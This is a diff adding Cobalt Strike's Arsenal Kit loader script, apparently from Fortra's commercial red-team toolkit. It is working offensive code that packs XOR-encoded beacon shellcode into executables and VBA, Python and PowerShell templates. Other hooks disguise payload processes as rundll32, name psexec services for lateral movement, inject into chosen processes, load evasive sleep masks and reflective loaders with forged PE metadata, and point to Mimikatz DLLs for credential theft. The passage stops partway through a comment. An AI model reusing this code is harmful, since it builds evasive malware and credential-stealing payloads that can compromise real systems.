@@ -1,0 +1,1122 @@
+# Init scripts sets global variables and loads other scripts
+
+###################################################################
+#
+# Cobalt Strike Arsenal Kit
+#
+# (c) 2012-2023 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
+#
+###################################################################
+
+## Variables
+
+$artifact_kit_path = script_resource("plugins/arsenal/artifact");
+$mimikatz_kit_path = script_resource("plugins/arsenal/mimikatz");
+$process_inject_kit_path = script_resource("plugins/arsenal/process_inject");
+$resource_kit_path = script_resource("plugins/arsenal/resource");
+$sleepmask_kit_path = script_resource("plugins/arsenal/sleepmask");
+$udrl_kit_path = script_resource("plugins/arsenal/udrl");
+
+## Helper Functions
+inline print_info {
+   println(formatDate("[HH:mm:ss] ") . "\cE[arsenal_kit.cna]\o " . $1);
+}
+
+inline print_error {
+   println(formatDate("[HH:mm:ss] ") . "\c4[arsenal_kit.cna]\o " . $1);
+}
+
+################################################
+
+print_info('######################################');
+print_info('# Cobalt Strike Arsenal Kit');
+print_info('# (c) 2012-2023 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.');
+print_info('######################################');
+
+## Helper Functions
+inline print_info {
+   println(formatDate("[HH:mm:ss] ") . "\cE[artifact_kit.cna]\o " . $1);
+}
+
+inline print_error {
+   println(formatDate("[HH:mm:ss] ") . "\c4[artifact_kit.cna]\o " . $1);
+}
+
+################################################
+## ARTIFACT KIT
+
+print_info("Artifact Kit Loaded");
+$artifact_kit_path = iff($artifact_kit_path eq "", script_resource(""), $artifact_kit_path);
+
+# Create a map to track information for the following settings
+# with these keys: service, spawnto_x86, spawnto_x64
+local('%ak_settings $initialized');
+
+# Helper function to validate the spawnto settings
+# Arguments
+#   $1 - $spawnto - string to validate
+#   $2 - $default - default string if validation fails.
+# Returns
+#   The $spawnto string if valid otherwise the $default string.
+sub validate_spawnto {
+   local('$spawnto $default');
+   ($spawnto, $default) = @_;
+
+   if (indexOf($spawnto, "%") ne $null) {
+      print_error("Artifact - The ak-settings does not support environment variables using default.");
+   } else if (strlen($spawnto) > 63) {
+      print_error("Artifact - The spawnto_[x86|x64] value can not exceed 63 characters using default.");
+   } else if (strlen($spawnto) == 0) {
+      print_error("Artifact - The spawnto_[x86|x64] value can not be an empty string using default.");
+   } else {
+      return $spawnto;
+   }
+   return $default;
+}
+
+# Helper function to initialize the settings from the profile
+# which updates the ak_settings map.
+# Arguments
+#   None
+#
+# Returns
+#   Nothing
+sub initialize {
+    local('$profile $spawnto');
+
+    if ($initialized eq "true") {
+       return;
+    }
+
+    # Get access to the profile information.
+    $profile = data_query("metadata")["c2profile"];
+
+    # Initialize the spawnto_x86 value from the profile
+    $spawnto = [$profile getString: ".post-ex.spawnto_x86"];
+    %ak_settings["spawnto_x86"] = validate_spawnto($spawnto, "C:\\Windows\\SysWOW64\\rundll32.exe");
+
+    # Initialize the spawnto_x64 value from the profile
+    $spawnto = [$profile getString: ".post-ex.spawnto_x64"];
+    %ak_settings["spawnto_x64"] = validate_spawnto($spawnto, "C:\\Windows\\System32\\rundll32.exe");
+
+    # Set the service name to empty string, which results in a random 7 character string.
+    %ak_settings["service"] = "";
+
+    $initialized = "true";
+}
+
+# Helper function to return the current settings to either the beacon console
+# $bid is set or to the script console.
+# Arguments
+#   $1 - $bid - beacon id
+#
+# Returns
+#   Nothing
+sub get_settings {
+   local('$bid');
+   ($bid) = @_;
+
+   blog2($bid, "artifact kit settings:");
+   blog2($bid, "   service     = '" . %ak_settings["service"] . "'");
+   blog2($bid, "   spawnto_x86 = '" . %ak_settings["spawnto_x86"] . "'");
+   blog2($bid, "   spawnto_x64 = '" . %ak_settings["spawnto_x64"] . "'");
+}
+
+# Helper function to set the name that will be returned via the PSEXEC_SERVICE hook.
+# Arguments
+#   $1 - $bid   - beacon id
+#   $2 - $value - The name to use for the PSEXEC_SERVICE hook
+#
+# Returns
+#   Nothing
+sub set_service {
+   local('$bid $value');
+   ($bid, $value) = @_;
+
+   blog2($bid, "Updating the psexec service name to \'$value\'");
+   %ak_settings["service"] = $value;
+}
+
+# Helper function to set the spawn process for the specified architecture.
+# Arguments
+#   $1 - $bid   - beacon id
+#   $2 - $arch  - The architecture
+#   $3 - $value - The command to spawn for the specified architecture
+#
+# Returns
+#   Nothing
+sub set_spawnto {
+   local('$bid $arch $value $setting $default $validated');
+   ($bid, $arch, $value) = @_;
+   $setting = "spawnto_$arch";
+
+   $default = iff($arch eq "x64", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\SysWOW64\\rundll32.exe");
+   $validated = validate_spawnto($value, $default);
+
+   if ($value ne $validated) {
+      berror($bid, "Error detected with the $setting value see script console additional information.");
+   }
+   blog2($bid, "Updating the $setting process to \'$validated\'");
+   %ak_settings[$setting] = $validated;
+}
+
+# Alias command to view and set the settings to be used for the artifact kit.
+# Arguments
+#   $1 - $bid     - beacon id
+#   $2 - $setting - (optional) The name of the setting to set
+#   $3 - $setting - (optional) The value for the specified setting
+#
+# Returns
+#   Nothing
+alias ak-settings {
+   local('$bid $setting $value $arch');
+   ($bid, $setting, $value) = @_;
+
+   # Make sure the settings have been initialized.
+   initialize();
+
+   # Set the setting based on the $settings argument.
+   if ($setting eq "service") {
+      set_service($bid, $value);
+   } else if (strlen($setting) == 11 && substr($setting, 0, 8) eq "spawnto_") {
+      $arch = substr($setting, 8);
+      if ($arch eq "x86" || $arch eq "x64") {
+         set_spawnto($bid, $arch, $value);
+      }
+   }
+
+   # display the current settings to the beacon console.
+   get_settings($bid);
+}
+
+# Register the alias so it is available with the help command.
+beacon_command_register(
+   "ak-settings",
+   "Set the artifact kit settings for artifact generation and the jump command for exploits: psexec, psexec64",
+   "Usage: ak-settings [setting] [value]\n\n" .
+   "Set settings to be used for generating artifacts through the artifact kit\n\n" .
+   "Supported settings:\n" .
+   "   service - Set the name to return for the PSEXEC_SERVICE hook.\n" .
+   "   spawnto_[x86|x64] - Set the migration process to use for the service executable artifacts.\n\n" .
+   "Usage Examples:\n" .
+   "   ak-settings service updater\n" .
+   "   ak-settings spawnto_x64 [c:\\path\\to\\whatever.exe]\n\n" .
+   "No arguments will display the current settings.\n"
+);
+
+# Helper function to determine which spawnto setting to return.
+# Arguments
+#   $1 - resource - name of the artifact being generated
+#
+# Returns
+#   The spawnto value for the requested architecture.
+sub get_spawnto {
+   local('$resource $setting');
+   ($resource) = @_;
+
+   # Make sure the settings have been initialized.
+   initialize();
+
+   # The $resource will have 32 or 64 within the name to determine architecture.
+   $setting = iff(indexOf($resource, "64") > 0, "spawnto_x64", "spawnto_x86");
+
+   return %ak_settings[$setting];
+}
+
+# Arguments
+#   $1 - resource - name of the artifact being generated
+#   $2 - data     - executable code of the artifact
+#   $3 - key      - (8 byte XoR)
+sub patch_migration_process {
+
+   local('$resource $data $key $index $buffer $b $zz');
+   ($resource $data, $key) = @_;
+
+   # find the location where the migration process should be patched.
+   # which is marked with 63 Ms
+   $index = indexOf($data, 'M' x 63);
+
+   # Only the service artifacts have this buffer
+   if ($index eq $null) {
+      return $data;
+   }
+
+   # Dealing with a service artifact pack the spawnto value into a buffer.
+   $buffer = allocate(64);
+
+   # Get the spawnto value for the service artifacts to use for migration
+   $spawnto = get_spawnto($resource);
+   if (strlen($spawnto) == 0) {
+       print_error("Artifact - The spawnto setting is not set. Using default.");
+       return $null;
+   }
+   print_info("Artifact - Process migration executable: $spawnto");
+
+   # pack our encoded spawnto into the buffer, make sure it is null terminated, fill in
+   # with random characters if needed.
+   for ($zz = 0; $zz < strlen($spawnto); $zz++) {
+      writeb( $buffer, chr((byteAt($spawnto, $zz) ^ $key[$zz % 8]) & 0xFF) ); # 8 byte XoR
+   }
+   writeb( $buffer, chr($key[$zz % 8] & 0xFF) ); # Null terminate spawnto string
+   for ($zz = $zz + 1; $zz < 64; $zz++) {
+      writeb( $buffer, chr(((int(rand() * 253) + 1) ^ $key[$zz % 8]) & 0xFF)); # Random characters
+   }
+
+   # retrieve the contents of the buffer.
+   closef($buffer);
+   $b = readb($buffer, -1);
+
+   # return the patched artifact
+   return replaceAt($data, "$[64]b", $index);
+}
+
+# Hook that is called to get the service name.
+set PSEXEC_SERVICE {
+   $service = %ak_settings["service"];
+   if (strlen($service) == 0) {
+      print_info("Artifact - PSEXEC_SERVICE service name: [7 random characters]");
+   } else {
+      print_info("Artifact - PSEXEC_SERVICE service name: $service");
+   }
+   return $service;
+}
+
+# Windows Executables and DLLs
+#
+# Arguments
+#  $1 - $resource - artifact file (e.g., artifact32.exe)
+#  $2 - $payload  - shellcode for beacon
+#
+# Return 
+#  our generated artifact
+#
+set EXECUTABLE_ARTIFACT_GENERATOR {
+
+   print_info("Artifact - EXECUTABLE_ARTIFACT_GENERATOR hook");
+
+   #NOTE: This script must match the settings in the compiled artifact kit
+   #      Refer to patch.c and patch.h for the PHEAR struct
+
+   local('$artifact_object $arch $handle $data $key $index $payload $payload_size $resource $buffer $b $zz $spawnto');
+
+   ($resource, $payload) = @_;
+   $payload_size = strlen($payload);
+   $artifact_object = getFileProper($artifact_kit_path, $resource);
+   print_info("Artifact - " . $artifact_object);
+
+   # try again or use the default artifact... I don't have it!
+
+   if (!-exists $artifact_object) {
+      print_error("Artifact - Failed to load custom artifact. Using default.");
+      return $null;
+   }
+
+   # read in the executable template
+   $handle = openf($artifact_object);
+
+   $data = readb($handle, -1);
+   closef($handle);
+
+   # generate a random 8 Byte XoR key
+   $key = @();
+   $key[0] = int(rand() * 253) + 1;
+   $key[1] = int(rand() * 253) + 1;
+   $key[2] = int(rand() * 253) + 1;
+   $key[3] = int(rand() * 253) + 1;
+   $key[4] = int(rand() * 253) + 1;
+   $key[5] = int(rand() * 253) + 1;
+   $key[6] = int(rand() * 253) + 1;
+   $key[7] = int(rand() * 253) + 1;
+
+   # Patch in the migration process name, check for $null in case of error
+   $data = patch_migration_process($resource, $data, $key);
+   if ($data eq $null) {
+      return $null;
+   }
+
+   # find the location of our data in the executable
+   $index = indexOf($data, 'A' x 1024);
+
+   ## PHEAR STRUCT Reference
+   # typedef struct {
+   #     int  offset;
+   #     int  length;
+   #     char key[8]; // 8 byte XoR
+   #     int  gmh_offset;
+   #     int  gpa_offset;
+   #     char payload[DATA_SIZE];
+   # } phear;
+
+   # pack data into a buffer
+   $buffer = allocate(1024);
+
+   # [offset of payload data in binary + offset of payload in the phear structure] - 4 bytes
+   writeb($buffer, pack("i-", $index + 24));
+
+   # [length of payload] - 4 bytes
+   writeb($buffer, pack("i-", $payload_size));
+
+   # [xor key] - 8 bytes
+   writeb($buffer, chr($key[0]) );
+   writeb($buffer, chr($key[1]) );
+   writeb($buffer, chr($key[2]) );
+   writeb($buffer, chr($key[3]) );
+   writeb($buffer, chr($key[4]) );
+   writeb($buffer, chr($key[5]) );
+   writeb($buffer, chr($key[6]) );
+   writeb($buffer, chr($key[7]) );
+
+   # [ bootstrap hint offsets ] - 8 bytes
+   # write our pointer offsets to allow the agent to bootstrap itself
+   # without walking the kernel32 Export Address Table
+   #
+   # Some shellcodes don't support this hint; so we need to check.
+   #
+   if (-hasbootstraphint $payload) {
+      writeb($buffer, pack("i-", payload_bootstrap_hint($payload, "GetModuleHandleA")));
+      writeb($buffer, pack("i-", payload_bootstrap_hint($payload, "GetProcAddress")));
+   }
+   else {
+      writeb($buffer, pack("i-", 0));
+      writeb($buffer, pack("i-", 0));
+   }
+
+   # [ encoded payload ] - payload length bytes
+   # pack our encoded payload into the buffer
+   for ($zz = 0; $zz < $payload_size; $zz++) {
+      writeb( $buffer, chr( (byteAt($payload, $zz) ^ $key[$zz % 8]) & 0xFF ) ); # 8 byte XoR
+   }
+
+   # retrieve the contents of the buffer.
+   closef($buffer);
+   $b = readb($buffer, -1);
+
+   if ($payload_size > 310272) {
+      local('$error');
+      $error = "Artifact - Payload size of $payload_size bytes does not fit into the artifact buffer size of 310272 bytes";
+      print_error($error);
+      show_error($error);
+   }
+   else {
+      print_info("Artifact - Patching the artifact with the payload size of $payload_size bytes");
+   }
+
+   # return our encoded shellcode.
+   return replaceAt($data, "$[1024]b", $index);
+}
+
+################################################
+## Sleepmask Kit
+
+print_info("Sleepmask Kit Loaded");
+$sleepmask_kit_path = iff($sleepmask_kit_path eq "", script_resource(""), $sleepmask_kit_path);
+
+# BEACON_SLEEP_MASK HOOK
+# Update a Beacon payload with a User Defined Sleep Mask code
+#
+# Arguments
+#  $1 = beacon type (default, smb, tcp)
+#  $2 = arch
+#
+# Returns
+#  the sleepmask code 
+#
+set BEACON_SLEEP_MASK {
+   print_info("Sleepmask - BEACON_SLEEP_MASK hook");
+
+   local('$handle $data $data_len $type $sm_object $sm_bof $sm_bof_len');
+
+   $type = "";
+   if ($1 ne "default") {
+      $type = "_ $+ $1";
+   }
+
+   $sm_object = getFileProper($sleepmask_kit_path, "sleepmask $+ $type $+ . $+ $2 $+ .o");
+
+   $handle = openf($sm_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+   $data_len = strlen($data);
+   print_info("Sleepmask - $sm_object length: $data_len bytes");
+
+   if ($data_len <= 0) {
+      print_error("Sleepmask - Error loading the sleep mask object file - Reverting to using the default sleep mask.");
+      return $null;
+   }
+
+   # extract the bof using the sleep_mask as the entry point
+   $sm_bof = bof_extract($data, "sleep_mask");
+   $sm_bof_len = strlen($sm_bof);
+   print_info("Sleepmask - Extracted sleep mask bof length: $sm_bof_len bytes");
+
+   if ($sm_bof_len <= 0) {
+      print_error("Sleepmask - Error extracting the sleep mask bof - Reverting to using the default sleep mask.");
+      return $null;
+   }
+
+   return $sm_bof;
+}
+
+################################################
+## Process Inject Kit
+
+print_info("Process Inject Kit Loaded");
+$process_inject_kit_path = iff($process_inject_kit_path eq "", script_resource(""), $process_inject_kit_path);
+
+# PROCESS_INJECT_SPAWN HOOK
+#
+# Hook to allow the user to define how the fork and run process injection
+# technique is implemented when executing post exploitation commands.
+#
+# Arguments
+#  $1 = Beacon ID
+#  $2 = memory injectable dll (position-independent code)
+#  $3 = true/false ignore process token
+#  $4 = x86/x64 - memory injectable DLL arch
+#
+# Return
+#  $null    - Use default fork and run process injection technique
+#  non-null - Use fork and run process injection technique from BOF
+#
+set PROCESS_INJECT_SPAWN {
+
+   print_info("Process Inject - PROCESS_INJECT_SPAWN hook");
+
+   local('$barch $handle $data $args $entry');
+ 
+   # Set the architecture for the beacon's session
+   $barch = barch($1);
+ 
+   # read in the injection BOF based on barch
+
+   $pi_object = getFileProper($process_inject_kit_path, "process_inject_spawn $+ . $+ $barch $+ .o");
+
+   $handle = openf($pi_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   print_info("Process Inject - " . $pi_object);
+   print_info("Process Inject - Length " . strlen($data));
+
+   # pack our arguments needed for the BOF
+   $args = bof_pack($1, "sb", $3, $2);
+ 
+   btask($1, "Process Inject using fork and run.");
+ 
+   # Set the entry point based on the dll's arch
+   $entry = "go $+ $4";
+   beacon_inline_execute($1, $data, $entry, $args);
+ 
+   # Let the caller know the hook was implemented.
+   return 1;
+}
+
+# PROCESS_INJECT_EXPLICIT HOOK
+#
+# Hook to allow the user to define how the explicit injection technique
+# is implemented when executing post exploitation commands.
+#
+# Arguments
+#  $1 = Beacon ID
+#  $2 = memory injectable dll for the post exploitation command
+#  $3 = the PID to inject into
+#  $4 = offset to jump to
+#  $5 = x86/x64 - memory injectable DLL arch
+#
+# Return
+#  $null    - Use default explicit injection technique
+#  non-null - Use explicit injection technique from BOF
+#
+set PROCESS_INJECT_EXPLICIT {
+
+   print_info("Process Inject - PROCESS_INJECT_EXPLICIT hook");
+
+   local('$barch $handle $data $args $entry');
+ 
+   # Set the architecture for the beacon's session
+   $barch = barch($1);
+ 
+   # read in the injection BOF based on barch
+
+   $pi_object = getFileProper($process_inject_kit_path, "process_inject_explicit $+ . $+ $barch $+ .o");
+
+   $handle = openf($pi_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   print_info("Process Inject - " . $pi_object);
+   print_info("Process Inject - Length " . strlen($data));
+   print_info("Process Inject - Target PID " . $3);
+ 
+   # pack our arguments needed for the BOF
+   $args = bof_pack($1, "iib", $3, $4, $2);
+ 
+   btask($1, "Process Inject using explicit injection into pid $3");
+ 
+   # Set the entry point based on the dll's arch
+   $entry = "go $+ $5";
+   beacon_inline_execute($1, $data, $entry, $args);
+ 
+   # Let the caller know the hook was implemented.
+   return 1;
+}
+
+################################################
+## User Defined Reflective Loader Kit
+
+print_info("UDRL Kit Loaded");
+$udrl_kit_path = iff($udrl_kit_path eq "", script_resource(""), $udrl_kit_path);
+
+# Helper function to sort the hash map
+# Arguments
+#  $1 - item 1
+#  $2 - item 2
+#
+# Returns
+#  $1 < $2  return a positive value
+#  $2 == $2 return 0
+#  $1 > $2  return a negative value
+#
+sub case_i_compare
+{
+   # lowercase the input and compare
+   $a = lc($1);
+   $b = lc($2);
+   return $a cmp $b;
+}
+
+# Helper function to display all information from the dll's PE
+# Arguments
+#  $1 - pemap - hash map of the PE information
+#
+# Returns
+#  Nothing
+#
+sub log_pe_map {
+   # setup local variables
+   local('%pemap $sorted_keys $key $out $val');
+   (%pemap) = @_;
+
+   @sorted_keys = sort(&case_i_compare, keys(%pemap));
+   foreach $key (@sorted_keys) {
+      $out = "$[50]key";
+      foreach $val (values(%pemap, @($key))) {
+         $out .= " $val";
+         println($out);
+      }
+   }
+}
+
+# Helper function to display information from the dll's PE
+# Arguments
+#  $1 - dll to display information from
+#
+# Returns
+#  Nothing
+#
+sub log_pe {
+    local('%pemap @val');
+
+    %pemap = pedump($1);
+
+    # Dump the Export Function information
+    @val = values(%pemap, @("Export.FunctionNames.<value>"));
+    print_info("UDRL - Export.FunctionNames: " . @val[0]);
+    @val = values(%pemap, @("Export.FunctionAddressesFixed.<value>"));
+    print_info("UDRL - Export.FunctionAddressesFixed: " . @val[0]);
+
+    # display all keys
+    # log_pe_map(%pemap);
+}
+
+
+# Helper function to display some of the profile settings for the stage section
+# Arguments
+#  $1 - Architecture
+#
+# Returns
+#   Nothing
+#
+sub log_stage_settings {
+    # Get access to the profile and some of the stage settings.
+    $profile = data_query("metadata")["c2profile"];
+
+    $rich_header = [$profile getString: ".stage.rich_header"];
+    $rich_is_set = iff((strlen($rich_header) == 0 || $rich_header eq "<DEFAULT>"), "not set", "is set");
+
+    print_info("UDRL - Stage settings:");
+    print_info("UDRL -    allocator:      " . [$profile getString: ".stage.allocator"]);
+    print_info("UDRL -    checksum:       " . [$profile getInt: ".stage.checksum"]);
+    print_info("UDRL -    cleanup:        " . [$profile getString: ".stage.cleanup"]);
+    print_info("UDRL -    compile time:   " . [$profile getString: ".stage.compile_time"]);
+    print_info("UDRL -    entry_point:    " . [$profile getInt: ".stage.entry_point"]);
+    print_info("UDRL -    image_size $1 $+ : " . [$profile getInt: ".stage.image_size_$1"]);
+    print_info("UDRL -    magic_mz $1 $+ :   " . [$profile getString: ".stage.magic_mz_$1"]);
+    print_info("UDRL -    magic_pe:       " . [$profile getString: ".stage.magic_pe"]);
+    print_info("UDRL -    name:           " . [$profile getString: ".stage.name"]);
+    print_info("UDRL -    module $1 $+ :     " . [$profile getString: ".stage.module_$1"]);
+    print_info("UDRL -    obfuscate:      " . [$profile getString: ".stage.obfuscate"]);
+    print_info("UDRL -    rich_header:    " . $rich_is_set);
+    print_info("UDRL -    sleep_mask:     " . [$profile getString: ".stage.sleep_mask"]);
+    print_info("UDRL -    smartinject:    " . [$profile getString: ".stage.smartinject"]);
+    print_info("UDRL -    stomppe:        " . [$profile getString: ".stage.stomppe"]);
+    print_info("UDRL -    userwx:         " . [$profile getString: ".stage.userwx"]);
+}
+
+# Helper function to update the rich header in the dll based on the stage.rich_header
+# profile setting.
+# Arguments
+#  $1 - dll to update
+#
+# Returns
+#  The original dll or the updated dll
+#
+sub update_rich_header {
+    # Get the rich header from the profile.
+    $profile = data_query("metadata")["c2profile"];
+    $rich_header = [$profile getString: ".stage.rich_header"];
+
+    if ($rich_header eq "<DEFAULT>") {
+        print_info("UDRL - Rich header will not be updated.");
+        return $1;
+    }
+
+    if (strlen($rich_header) == 0) {
+        print_info("UDRL - Rich header will be removed.");
+        return pe_remove_rich_header($1);
+    } else {
+        print_info("UDRL - Rich header will be replaced using the header from the profile.");
+        return pe_insert_rich_header($1, $rich_header);
+    }
+}
+
+# Helper function to update the compile time in the dll based on the stage.compile_time
+# profile setting.  The stage.compile_time requires the string to be in the format
+# of 'dd MMM YYYY hh:mm:ss'.  If you want to use a time stamp in milliseconds instead
+# you can use this function instead:
+# sub update_compile_time {
+#    $ts = <hard_code_timestamp_in_ms>;
+#    print_info("UDRL - Compile time will be updated with this timestamp: $ts");
+#    return pe_set_compile_time_with_long($1, $ts);
+# }
+# Arguments
+#  $1 - dll to update
+#
+# Returns
+#  The original dll or the updated dll
+#
+sub update_compile_time {
+    # Get the rich header from the profile.
+    $profile = data_query("metadata")["c2profile"];
+    $compile_time = [$profile getString: ".stage.compile_time"];
+
+    if ($compile_time eq "") {
+        print_info("UDRL - Compile time will not be updated.");
+        return $1;
+    }
+
+    print_info("UDRL - Compile time will be updated with this timestamp: $compile_time");
+    return pe_set_compile_time_with_string($1, $compile_time);
+}
+
+# Helper function to update the image size in the dll based on the stage.image_size_[x86|x64]
+# profile setting.
+# Arguments
+#  $1 - dll to update
+#  $2 - arch, which is needed to get the correct image_size
+#
+# Returns
+#  The original dll or the updated dll
+#
+sub update_image_size {
+    # Get the rich header from the profile.
+    $profile = data_query("metadata")["c2profile"];
+    $image_size = [$profile getInt: ".stage.image_size_$2"];
+
+    if ($image_size <= 0) {
+        print_info("UDRL - Image size will not be updated.");
+        return $1;
+    }
+
+    print_info("UDRL - Image size will be updated with this value: $image_size");
+    return pe_set_value_at($1, "SizeOfImage", $image_size);
+}
+
+# Helper function to update the checksum in the dll based on the stage.checksum
+# profile setting.
+# Arguments
+#  $1 - dll to update
+#
+# Returns
+#  The original dll or the updated dll
+sub update_checksum {
+    # Get the rich header from the profile.
+    $profile = data_query("metadata")["c2profile"];
+    $checksum = [$profile getInt: ".stage.checksum"];
+
+    if ($checksum <= 0) {
+        print_info("UDRL - Checksum will not be updated.");
+        return $1;
+    }
+
+    print_info("UDRL - Checksum will be updated with this value: $checksum");
+    return pe_set_checksum($1, $checksum);
+}
+
+# Helper function to update the export name in the dll based on the stage.name
+# profile setting.
+# Arguments
+#  $1 - dll to update
+#
+# Returns
+#  The original dll or the updated dll
+#
+sub update_export_name {
+    # Get the rich header from the profile.
+    $profile = data_query("metadata")["c2profile"];
+    $name = [$profile getString: ".stage.name"];
+
+    if ($name eq "") {
+        print_info("UDRL - Export name of the dll will not be updated.");
+        return $1;
+    }
+
+    print_info("UDRL - Export name of the dll will be updated to: $name");
+    return pe_set_export_name($1, $name);
+}
+
+# generate_my_dll helper function
+# See BEACON_RDLL_GENERATE for information.
+#
+# Arguments
+#  $1 = dll file name
+#  $2 = dll content
+#  $3 = arch
+#
+# Returns
+#  $null - Use the default Cobalt Strike Reflective Loader.
+#  Updated dll with User Defined Reflective Loader
+#
+sub generate_my_dll {
+
+   # setup local variables
+   local('$handle $data $loader $temp_dll $udrl_o $dll_filename, $arch');
+   ($dll_filename, $temp_dll, $arch) = @_;
+
+   # Display the stage settings for information in the script console
+   # Comment out the function call if this information is not needed.
+   log_stage_settings($arch);
+
+   # Load a object file that contains a Reflective Loader for the correct architecture.
+   $udrl_o = getFileProper($udrl_kit_path, "ReflectiveLoader. $+ $arch $+ .o");
+   $handle = openf($udrl_o);
+   $data   = readb($handle, -1);
+   closef($handle);
+   print_info("UDRL - $udrl_o length: " . strlen($data) . " bytes");
+
+   if (strlen($data) <= 0) {
+      print_error("UDRL - Error loading reflective loader object file  - Reverting to using default Cobalt Strike Reflective Loader.");
+      return $null;
+   }
+
+   # extract loader from the object file data.
+   $loader = extract_reflective_loader($data);
+   print_info("UDRL - Extracted loader length: " . strlen($loader) . " bytes");
+
+   if (strlen($loader) <= 0) {
+      print_error("UDRL - Error loading reflective loader object file  - Reverting to using default Cobalt Strike Reflective Loader.");
+      return $null;
+   }
+
+   # Do any pre processing steps to the dll before setting up the reflective loader.
+   $temp_dll = setup_strings($temp_dll);
+   $temp_dll = update_rich_header($temp_dll);
+   $temp_dll = update_compile_time($temp_dll);
+   $temp_dll = update_image_size($temp_dll, $arch);
+   $temp_dll = update_checksum($temp_dll);
+   $temp_dll = update_export_name($temp_dll);
+
+   # Setup the reflective loader in the beacon.
+   $temp_dll = setup_reflective_loader($temp_dll, $loader);
+   if (strlen($temp_dll) <= 0) {
+      print_error("UDRL - Error setting up reflective loader  - Reverting to using default Cobalt Strike Reflective Loader.");
+      return $null;
+   }
+
+   # Note: setup_transformations may prepend info to the dll need to
+   # call log_pe before transformations.
+   log_pe($temp_dll);
+
+   # Do any post processing steps after setting up the reflective loader.
+   $temp_dll = setup_transformations($temp_dll, $arch);
+   if (strlen($temp_dll) <= 0) {
+      print_error("UDRL - Error setting up transformations  - Reverting to using default Cobalt Strike Reflective Loader.");
+      return $null;
+   }
+
+   # Return the updated beacon dll.
+   return $temp_dll;
+}
+
+# BEACON_RDLL_GENERATE HOOK
+#
+# Arguments
+#  $1 = dll file name
+#  $2 = dll content
+#  $3 = arch
+#
+# Returns
+#  $null    - Use default Cobalt Strike Reflective Loader
+#  non-null - Updated dll with User Defined Reflective Loader
+#
+set BEACON_RDLL_GENERATE {
+   print_info("UDRL - BEACON_RDLL_GENERATE hook");
+
+   print_info("UDRL - " . $1);
+   return generate_my_dll($1, $2, $3);
+}
+
+# BEACON_RDLL_SIZE HOOK
+# Override the beacon loader to load beacons with larger space reserved for the
+# User Defined Reflective Loader function.
+#
+# Arguments
+#  $1 = dll name
+#  $2 = arch
+#
+# Returns
+#  a string representing the size to use for the Reflective Loader.
+#  valid values are: [0, 5, 100]
+set BEACON_RDLL_SIZE {
+    print_info("UDRL - BEACON_RDLL_SIZE hook");
+
+    $size = 5;
+    print_info("UDRL - Use the $size $+ K Reflective Loader");
+    return "$size";
+}
+################################################
+## Mimikatz Kit
+
+print_info("Mimikatz Kit Loaded");
+$mimikatz_kit_path = iff($mimikatz_kit_path eq "", script_resource(""), $mimikatz_kit_path);
+
+set MIMIKATZ_INTERNAL {
+   print_info("Mimikatz - MIMIKATZ_INTERNAL hook");
+
+   # In case the mimikatz-full.dll does not work try using the mimikatz-max.dll instead.
+   # The mimikatz-max.dll requires Cobalt Strike 4.6 or later as the malleable C2 profile
+   # setting 'tasks_max_size' needs to be set large enough to support the size.
+   # To use the mimikatz-max.dll choose which getFileName line is not commented out.
+   # Then rebuild the Arsenal or Mimikatz kit and reload the cna script.
+   $mimidllname = getFileName($1);
+   # $mimidllname = getFileName(replace($1, "full", "max", 1));
+   # $mimidllname = getFileName(replace($1, "chrome|full|min", "max", 1));
+
+   $mimidllpath = getFileProper($mimikatz_kit_path, $mimidllname);
+   print_info("Mimikatz - DLL " . $mimidllpath);
+   return $mimidllpath;
+}
+
+################################################
+## Resource Kit
+
+print_info("Resource Kit Loaded");
+$resource_kit_path = iff($resource_kit_path eq "", script_resource(""), $resource_kit_path);
+
+# RESOURCE_GENERATOR HOOK
+#
+# Arguments
+#  $1 = the file
+#  $2 = x86 shellcode
+#  $3 = x64 shellcode
+#
+# Return
+#  our generated resource
+#
+set RESOURCE_GENERATOR {
+   print_info("Resource - RESOURCE_GENERATOR hook");
+
+   local('$script_path $handle $data, $template');
+
+   $script_path = getFileProper($resource_kit_path, $1);
+   # no resource? no problem.
+   if (!-exists $script_path) {
+      print_error("Resource - Script not found " . $script_path);
+      return $null;
+   }
+
+   # read in the resource 
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   # format our shellcode AND patch it into the resource
+   $template = $1;
+   if ($template eq "template.x86.vba") {
+      return strrep($data, '$PAYLOAD$', 'myArray = ' . transform($2, "vba"));
+   }
+   else if ($template eq "template.py") {
+      return strrep($data, '$$CODE32$$', transform($2, "veil"), '$$CODE64$$', transform($3, "veil"));
+   }
+   else if ($template eq "template.x86.ps1" && -hasbootstraphint $2) {
+      # we're going to use a different template in this circumstance.
+      $handle = openf(getFileProper($resource_kit_path, "template.hint.x86.ps1"));
+      $data   = readb($handle, -1);
+      closef($handle);
+
+      # calculate the locations of these hints.
+      local('$gmh_offset $gpa_offset');
+      $gmh_offset = payload_bootstrap_hint($2, "GetModuleHandleA");
+      $gpa_offset = payload_bootstrap_hint($2, "GetProcAddress");
+
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($2, chr(35)) ), '%%GPA_OFFSET%%', $gpa_offset, '%%GMH_OFFSET%%', $gmh_offset);
+   }
+   else if ($template eq "template.x64.ps1" && -hasbootstraphint $3) {
+      # we're going to use a different template in this circumstance.
+      $handle = openf(getFileProper($resource_kit_path, "template.hint.x64.ps1"));
+      $data   = readb($handle, -1);
+      closef($handle);
+
+      # calculate the locations of these hints.
+      local('$gmh_offset $gpa_offset');
+      $gmh_offset = payload_bootstrap_hint($3, "GetModuleHandleA");
+      $gpa_offset = payload_bootstrap_hint($3, "GetProcAddress");
+
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($3, chr(35)) ), '%%GPA_OFFSET%%', $gpa_offset, '%%GMH_OFFSET%%', $gmh_offset);
+   }
+   else if ($template eq "template.x86.ps1") {
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($2, chr(35)) ));
+   }
+   else if ($template eq "template.x64.ps1") {
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($3, chr(35)) ));
+   }
+
+   # return null if we don't know about the resource (this allows some future-proofing)
+   print_error("Resource - Unable to patch in shellcode for template " . $template);
+   return $null;
+}
+
+# reduce the size of a PowerShell script.
+# $1 = the script to compress...
